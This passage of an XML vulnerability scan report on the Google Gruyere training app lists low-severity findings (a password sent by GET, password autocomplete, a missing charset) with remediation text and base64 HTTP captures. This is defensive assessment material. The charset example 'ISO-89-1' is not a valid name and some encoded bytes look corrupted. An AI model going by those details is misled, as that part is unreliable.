RyPjx0ZD4KICAgIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CiAgICA8YnI+PHNwYW4gc3R5bGU9ImNvbG9yOnJlZCI+PGI+V0FSTklORzogR3J1eWVyZSBpcyBub3Qgc2VjdXJlLjxicj4KICAgIERvIG5vdCB1c2UgYSBwYXNzd29yZCB0aGF0IHlvdSB1c2UgZm9yIGFueSByZWFsIHNlcnZpY2UuPGJyPgogICAgRG8gbm90IHVwbG9hZCBhbnkgcGVyc29uYWwgb3IgcHJpdmF0ZSBkYXRhLjwvYj48L3NwYW4+CjwvdGQ+PC90cj4KCgo8aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdp9hdXRob3InIHZhbHVlPSdUcnVlJz4KCjx0cj48dGQ+PC90ZD48dGQgYWxpZ249J3JpZ2h0Jz4KICAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDcmVhdGUgYWNjb3VudCc+CjwvdGQ+PC90cj4KPC90YWJsZT4KPC9mb3JtPgo8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoK]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5278429548413836288</serialNumber>
    <type>4195072</type>
    <name><![CDATA[Password submitted using GET method]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl]]></location>
    <severity>Low</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some applications use the GET method to submit passwords, which are transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing passwords into the URL increases the risk that they will be captured by an attacker.</p>
<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>All forms submitting passwords should use the POST method. To achieve this, applications should specify the method attribute of the FORM tag as <b>method="POST"</b>. It may also be necessary to modify the corresponding server-side form handler to ensure that submitted passwords are properly retrieved from the message body, rather than the URL.
</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/598.html">CWE-598: Information Exposure Through Query Strings in GET Request</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The page contains a form with the following action URL, which is submitted using the GET method:<ul><li>http://google-gruyere.appspot.com/421683968655469260586300829583795792326/saveprofile</li></ul>The form contains the following password field:<ul><li>pw</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[pw]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3YWNjb3VudC5ndGwgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lw0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNTJjM2NjZWZhNmI4NWZmNjEwNDkyNTUxMGRlM2YzNGUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDoxNiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzM2MA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFByb2ZpbGU8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxoMj5HcnV5ZXJlOiBTaWduIHVwPC9oMj4KCjxkaXYgY2xhc3M9J2NvbnRlbnQnPgo8aDM+U2lnbiB1cCBmb3IgYSBuZXcgYWNjb3VudC48L2gzPgoKCgo8Zm9ybSBtZXRob2Q9J2dldCcgYWN0aW9uPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NhdmVwcm9maWxlJz4KPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYWN0aW9uJyB2YWx1ZT0nbmV3Jz4KCjx0YWJsZT48dHI+PHRkPgogICAgVXNlciBuYW1lOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3VpZCcgdmFsdWU9JycgbWF4bGVuZ3RoPScxNic+CjwvdGQ+PC90cj4KPHRyPjx0ZD4KICAgIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CiAgICA8YnI+PHNwYW4gc3R5bGU9ImNvbG9yOnJlZCI+PGI+V0FSTklORzogR3J1eWVyZSBpcyBub3Qgc2VjdXJlLjxicj4KICAgIERvIG5vdCB1c2UgYSBwYXNzd29yZCB0aGF0IHlvdSB1c2UgZm9yIGFueSByZWFsIHNlcnZpY2UuPGJyPgogICAgRG8gbm90IHVwbG9hZCBhbnkgcGVyc29uYWwgb3IgcHJpdmF0ZSBkYXRhLjwvYj48L3NwYW4+CjwvdGQ+PC90cj4KCgo8aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdp9hdXRob3InIHZhbHVlPSdUcnVlJz4KCjx0cj48dGQ+PC90ZD48dGQgYWxpZ249J3JpZ2h0Jz4KICAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDcmVhdGUgYWNjb3VudCc+CjwvdGQ+PC90cj4KPC90YWJsZT4KPC9mb3JtPgo8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoK]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>78010751596961792</serialNumber>
    <type>5244928</type>
    <name><![CDATA[Password field with autocomplete enabled]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl]]></location>
    <severity>Low</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Most browsers have a facility to remember user credentials that are entered into HTML forms. This function can be configured by the user and also by applications that employ user credentials. If the function is enabled, then credentials entered by the user are stored on their local computer and retrieved by the browser on future visits to the same application.</p>
<p>The stored credentials can be captured by an attacker who gains control over the user's computer. Further, an attacker who finds a separate application vulnerability such as cross-site scripting may be able to exploit this to retrieve a user's browser-stored credentials. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To prevent browsers from storing credentials entered into HTML forms, include the attribute <b>autocomplete="off"</b> within the FORM tag (to protect all form fields) or within the relevant INPUT tags (to protect specific individual fields).</p>
<p>Please note that modern web browsers may ignore this directive. In spite of this there is a chance that not disabling autocomplete may cause problems obtaining PCI compliance.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The page contains a form with the following action URL:<ul><li>http://google-gruyere.appspot.com/421683968655469260586300829583795792326/saveprofile</li></ul>The form contains the following password field with autocomplete enabled:<ul><li>pw</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[pw]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3YWNjb3VudC5ndGwgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lw0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNTJjM2NjZWZhNmI4NWZmNjEwNDkyNTUxMGRlM2YzNGUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDoxNiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzM2MA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFByb2ZpbGU8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxoMj5HcnV5ZXJlOiBTaWduIHVwPC9oMj4KCjxkaXYgY2xhc3M9J2NvbnRlbnQnPgo8aDM+U2lnbiB1cCBmb3IgYSBuZXcgYWNjb3VudC48L2gzPgoKCgo8Zm9ybSBtZXRob2Q9J2dldCcgYWN0aW9uPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NhdmVwcm9maWxlJz4KPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYWN0aW9uJyB2YWx1ZT0nbmV3Jz4KCjx0YWJsZT48dHI+PHRkPgogICAgVXNlciBuYW1lOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J3VpZCcgdmFsdWU9JycgbWF4bGVuZ3RoPScxNic+CjwvdGQ+PC90cj4KPHRyPjx0ZD4KICAgIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CiAgICA8YnI+PHNwYW4gc3R5bGU9ImNvbG9yOnJlZCI+PGI+V0FSTklORzogR3J1eWVyZSBpcyBub3Qgc2VjdXJlLjxicj4KICAgIERvIG5vdCB1c2UgYSBwYXNzd29yZCB0aGF0IHlvdSB1c2UgZm9yIGFueSByZWFsIHNlcnZpY2UuPGJyPgogICAgRG8gbm90IHVwbG9hZCBhbnkgcGVyc29uYWwgb3IgcHJpdmF0ZSBkYXRhLjwvYj48L3NwYW4+CjwvdGQ+PC90cj4KCgo8aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdp9hdXRob3InIHZhbHVlPSdUcnVlJz4KCjx0cj48dGQ+PC90ZD48dGQgYWxpZ249J3JpZ2h0Jz4KICAgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDcmVhdGUgYWNjb3VudCc+CjwvdGQ+PC90cj4KPC90YWJsZT4KPC9mb3JtPgo8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoK]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4553064860931597312</serialNumber>
    <type>8389120</type>
    <name><![CDATA[HTML does not specify charset]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/newaccount.gtl]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>If a  response states that it contains HTML content but does not specify a character set, then the browser may analyze the HTML and attempt to determine which character set it appears to be using. Even if the majority of the HTML actually employs a standard character set such as UTF-8, the presence of non-standard characters anywhere in the response may cause the browser to interpret the content using a different character set. This can have unexpected results, and can lead to cross-site scripting vulnerabilities in which non-standard encodings like UTF-7 can be used to bypass the application's defensive filters.</p>
<p>In most cases, the absence of a charset directive does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>For every response containing HTML content, the application should include within the Content-type header a directive specifying a standard recognized character set, for example <b>charset=ISO-89-1</b>.
</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/436.html">CWE-436: Interpretation Conflict</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3YWNjb3VudC5ndGwgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lw0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNTJjM2NjZWZhNmI4NWZmNjEwNDkyNTUxMGRlM2YzNGUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDoxNiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMzM2MA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFByb2ZpbGU8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQt